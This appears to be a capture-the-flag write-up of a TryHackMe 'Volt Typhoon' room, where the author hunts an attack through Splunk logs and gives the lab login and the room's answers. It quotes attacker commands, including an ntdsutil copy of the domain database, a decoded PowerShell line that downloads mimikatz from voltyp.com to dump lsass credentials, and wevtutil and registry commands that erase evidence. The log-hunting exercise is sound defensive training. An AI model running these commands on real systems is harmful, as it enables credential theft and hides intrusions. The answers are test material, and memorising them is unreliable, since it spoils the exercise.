# Volt Typhoon THM Challenge

When I launched the VM and connect using a VPN, I login to the splunk instance using the following creds: volthunter:voltyp1010

I started combing through the logs by clicking search & reporting and this is when I starting looking at the first question related to initial access.

Comb through the ADSelfService Plus logs to begin retracing the attacker’s steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?

I use this query to find the answer to the question: index="main" username="dean-admin" password. 

After sifting through the logs, towards the bottom I see the first password change at 2024-03-24T11:10:22.

![image](https://github.com/user-attachments/assets/966fd6fe-f577-46a4-ab4b-d773f7d8356e)

The next question asks the name of the new admin account created once the attack gained access. Using the same query, all I had to do was look one log above to find the name of the new account was voltyp-admin.

![image](https://github.com/user-attachments/assets/51c630db-4d73-453b-af8c-1bd9bcd601f0)

After this, I move onto Execution where the question asks, "In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?" 

This time I used the query index="main" username="dean-admin" server01 because I knew the command would involve something related to server01. Fortunately, only one log showed up and its the one I need to answer the question.

![image](https://github.com/user-attachments/assets/6104a4c9-45cb-4648-8cbb-8318139845c8)

Next question says the attacker using ntdsutil to create a copy of the database. Using ntdsutil in my query, I found that this command was used, 

`cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \"ac i ntds\" \"ifm create full C:\Windows\Temp\tmp\temp.dit`

This is showing a new folder made in Windows\Temp\tmp, and a new file called temp.dit. This was interesting so I added temp.dit to my query and found this.

![image](https://github.com/user-attachments/assets/d32a6883-4099-48e5-905a-f00deff190e4)

I found the attacker set the password as d5ag0nm@5t3r.

Task 4 is persistence.

The question says that the attacker established persistence by placing a webshell using base 64 encoded text but where did they place it?

I gave a guess in my search and thought that maybe they placed it in Windows\Temp so I added temp to my query and found this very suspicious log here.

![image](https://github.com/user-attachments/assets/63a3b68a-0398-4b36-8604-e67642738d4f)

I decoded the base 64 using https://www.base64decode.org/ and found that it was indeed running a webshell. The answer here was C:\Windows\Temp

Task 5 is defense evasion, the first question asks, "In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?"

Knowing they were removing the most recently used, I added *MRU* to my search and found the cmdlet Remove-ItemProperty.

![image](https://github.com/user-attachments/assets/c8dea06d-3873-429b-843b-8e812084cc86)

For the next question I appended cmd.exe to my query and found the file cl64.gif.

The next question asked to find a path for the registry, I first appended registry to my query but only junk came up. After trying that, I added HKEY instead and found this path: 

![image](https://github.com/user-attachments/assets/c2874d6a-d19f-43b0-896a-f8b37c7b44de)

Task 6 is cred access, the question says they use reg query which is huge. I need to find the 3 pieces of software they are investigating using reg query. This is fairly simple as I just add reg query to my spl query. 

Using this query I found the software they were using was OpenSSH, putty, and realvnc. Adding reg query to the query only made me get 8 logs so it was fairly easy to sift through.

I had a hard time finding the decoded command. Eventually I figured out that I had to append hidden to my query to find the encoded command.

![image](https://github.com/user-attachments/assets/c9a4e0ec-2db7-4c7c-96db-186213f711a8)

Decoding this base64 once again gives me the command, `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait`

Task 7 involves lateral movement around the network. The first question asks, The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?
Answer Format: Increasing order separated by a space.

I appended wevutil to my search and searched through the 12 logs I got to find the event IDs 4624 4625 and 4769.

The next question is asking for the new webshell used for server-02. Appending server-02 gives me over 500 logs so we cant use that, but I can use the original webshell that was found earlier to find the new one. Appending the old
webshell iisstart.aspx to my query I was able to find AuditReport.jspx was the new file.

![image](https://github.com/user-attachments/assets/125f7801-8ba3-40db-b382-79cd97e5660e)

Task 8 is collection and the only question is: The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell?
Answer Format: Increasing order separated by a space.

Appending Copy-Item can help me in my search. When I used it in my search I found the 3 files copied were 2022.csv, 2023.csv, and 2024.csv, all of which I assumed contained valuable company info.

The last task, task 9 is about C2 & Cleanup. The first question asks, The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?
Answer Format: IP Port.

I used netsh in my search and only found 4 logs, among them I found this one: 

![image](https://github.com/user-attachments/assets/402648bc-f78b-4cc1-9432-a143875515a4)

This has all the info I needed to know about the c2 server and its address.

The last question asks, To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?

This time, I appended wevtutil cl to my search to find the types of logs they were trying to clear. I found these logs below:

![image](https://github.com/user-attachments/assets/eb73db01-94a2-48ac-9a9d-2d4847249eed)

Application, Security, Setup, and System. 

Thats It! I hope you enjoyed following along this room and hope this helped you if you got stuck somewhere!





